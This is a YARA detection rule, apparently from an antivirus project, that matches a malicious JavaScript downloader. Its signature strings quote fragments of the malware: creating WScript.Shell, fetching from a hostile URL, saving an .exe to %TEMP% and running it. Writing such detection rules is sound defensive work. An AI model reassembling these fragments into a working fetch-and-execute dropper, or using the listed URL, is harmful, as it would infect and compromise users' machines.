rule sig_20160330_2f97eb152ab75748b8432909861aeeb8 {
  meta:
    description = "datamaliciousorder - file 20160330_2f97eb152ab75748b8432909861aeeb8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5c68bd3ac42333e472d408823f0d538d637ba51a2fcb1eec0bd315a115613e03"

  strings:
    $s1  = "function _FH(_DN, _K){_TH = _TH * 1; return _DN - _K;};" fullword ascii
    $s2  = "var _T = function _R() {return WScript[_X](\"WScript\"+\".Shell\");}(), _WE = 11;" fullword ascii
    $s3  = "_IJ[_A](\"GET\", \"http://ru-optovik.ru/j9ssl\", false);" fullword ascii
    $s4  = "if (_IJ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _O() {return _T[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"IOYktwh1Q6ME.ex\" + \"e\";};" fullword ascii
    $s6  = "function _II(){return _U + \"\";};" fullword ascii
    $s7  = "function _KJ() {return ((_L == true) && (_L == _YN)) ? 1 : _TH;};" fullword ascii
    $s8  = "function _N(_V0){_T[\"Run\"](_V0, _TH, _TH);};" fullword ascii
    $s9  = "return _FH(_U0, _AD);" fullword ascii
    $s10 = "function _B(){return _X;};" fullword ascii
    $s11 = "function _V(_A0) {var _SW = (1, 2, 3, 4, 5, _A0); return _SW;};" fullword ascii
    $s12 = " while (_IF){" fullword ascii
    $s13 = "var _I1 = new this[\"Date\"]();" fullword ascii
    $s14 = "function _YG(){return 22;};" fullword ascii
    $s15 = "function _I()" fullword ascii
    $s16 = "var _L = false;" fullword ascii
    $s17 = "_L = true; " fullword ascii
    $s18 = "_YN = true; " fullword ascii
    $s19 = "var _YN = false;" fullword ascii
    $s20 = "var _GU = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}